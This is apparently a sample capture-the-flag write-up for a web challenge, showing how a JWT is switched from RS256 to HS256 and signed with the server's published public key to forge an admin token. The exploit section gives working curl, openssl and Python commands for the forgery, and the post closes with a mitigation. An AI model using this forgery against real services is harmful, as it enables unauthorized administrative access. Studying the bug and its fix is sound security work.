---
title: "babywaf — JWT alg confusion"
description: "Forging an admin session by switching a JWT from RS256 to HS256 and signing with the public key."
pubDate: 2026-05-15
tags: ["jwt", "auth-bypass", "web"]
event: "SamuraiCTF 2026"
category: "web"
difficulty: "Medium"
points: 300
team: "ronin"
draft: false
---

> Sample CTF writeup. Replace with your own under `src/content/ctf/`.

## Challenge

A note-taking app issues a JWT on login. The `/admin` panel checks the `role`
claim. Our user token has `role: user`. The server's public key is exposed at
`/jwks.json`.

## Recon

Decode the token — it's signed with **RS256** (asymmetric):

```bash
echo "$TOKEN" | cut -d. -f1 | base64 -d
# {"alg":"RS256","typ":"JWT"}
```

Because the public key is readable and the server doesn't pin the algorithm,
this is a textbook **alg-confusion** bug: sign an `HS256` token using the RSA
**public key** as the HMAC secret. The server verifies HS256 with the same key
it published, and accepts our forgery.

## Exploit

```bash
# grab the public key
curl -s http://chall/jwks.json | jq -r '.keys[0].x5c[0]' | \
  base64 -d > pub.der
openssl x509 -inform der -in pub.der -pubkey -noout > public.pem

# forge an admin token signed HS256 with the public key as the secret
python3 forge.py --key public.pem --claim role=admin
```

```python
# forge.py (core)
import jwt
tok = jwt.encode({"user": "ronin", "role": "admin"},
                 open("public.pem").read(), algorithm="HS256")
print(tok)
```

Send it:

```bash
curl http://chall/admin -H "Authorization: Bearer $FORGED"
# flag{alg_confusion_is_forever}
```

## Mitigation

Pin the expected algorithm server-side (`algorithms=["RS256"]`) and never let the
token header dictate the verification algorithm.
